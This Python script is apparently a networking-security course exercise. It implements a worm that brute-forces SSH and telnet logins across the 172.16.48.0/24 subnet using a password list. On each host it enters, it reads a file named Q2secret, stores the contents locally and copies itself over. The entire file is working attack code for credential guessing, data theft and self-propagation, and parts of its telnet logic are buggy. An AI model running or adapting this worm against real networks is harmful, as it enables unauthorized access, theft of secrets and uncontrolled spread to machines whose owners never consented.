import paramiko
import telnetlib
import shutil
import time
import base64
import pipes
ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
logins = []
shutil.copy("./Q2worm.py", "./Solutions")
with open('./Q2worm.py', 'r') as file:
    q2wordcontents = file.read()
with open('Q2pwd', 'r') as file: 
    for line in file: 
        login = [part for part in (line.strip()).split(" ")]
        logins.append(login) 

def sshConnect(host, username, password):
    with open('./Solutions/Q2secrets', 'a+') as file:
        try:
            ssh.connect(hostname = host, username = username, password = password, banner_timeout=5)
            print("Connected using ssh to " + host + " using username " + username + " and password " + password)
        except paramiko.ssh_exception.NoValidConnectionsError:
            ssh.close()
            file.close()
            return False
        except:
            ssh.close()
            file.close()
            return True
        print("Getting current directory...")
        stdin, stdout, stderr = ssh.exec_command("pwd")
        for line in stdout:
            homedirectory = str(line).strip()
        print("Copying contents of Q2secret...")
        stdin, stdout, stderr = ssh.exec_command("cat Q2secret")
        for line in stdout:
            file.write(line)
        print("Copying Q2worm to remote...")
        ftp = ssh.open_sftp()
        ftp.put("./Q2worm.py", homedirectory + "/Q2worm.py")
    ssh.close()
    file.close()
    return True
def quote(b):
    if isinstance(b, bytes):
        return pipes.quote(b.decode('utf-8')).encode('utf-8')
    else:
        return pipes.quote(b).encode('utf-8')
def telnetConnect(host, username, password):
    with open('./Solutions/Q2secrets', 'a+') as file:
        # try:
        try:
            tn = telnetlib.Telnet(host)
            tn.read_until(b"cse3140-HVM-domU login: ")
        except:
            file.close()
            return False
        tn.write((username + "\r").encode('utf-8'))
        tn.read_until(b"Password: ")
        tn.write((password + "\r").encode('utf-8'))
        if tn.read_until(b"Login incorrect"):
            tn.close()
            file.close()
            return True
        print("Connected using telnet to " + host + " using username " + username + " and password " + password)
        print("Getting current directory...")
        tn.write("pwd\r".encode('utf-8'))
        directory = tn.read_eager()
        print("Copying contents of Q2secret...")
        tn.write("cat Q2secret\r".encode('utf-8'))
        q2secret = tn.read_eager()
        for line in q2secret:
            file.write(line)
        print("Copying Q2worm to remote...")
        tn.write("touch Q2worm.py\r".encode('utf-8'))
        expected = b'success'
        tn.write(b'echo %b | openssl base64 -d\n' % quote(base64.b64encode(expected)))
        tn.read_until(expected, timeout=1)
        tn.write(b'openssl base64 -d <<\'*END*\' %b %b\n' %
        (b'>>', quote(directory)))
        tn.write(base64.encodebytes(q2wordcontents))
        tn.write(b'\n*END*\n')
    tn.close()
    file.close()
    return True
for i in range(256):
    host = "172.16.48." + str(i)
    for login in logins:
        if not sshConnect(host, login[0], login[1]):
            break
    time.sleep(5)
for i in range(256):
    host = "172.16.48." + str(i)
    for login in logins:
        if not telnetConnect(host, login[0], login[1]):
            break
    time.sleep(5)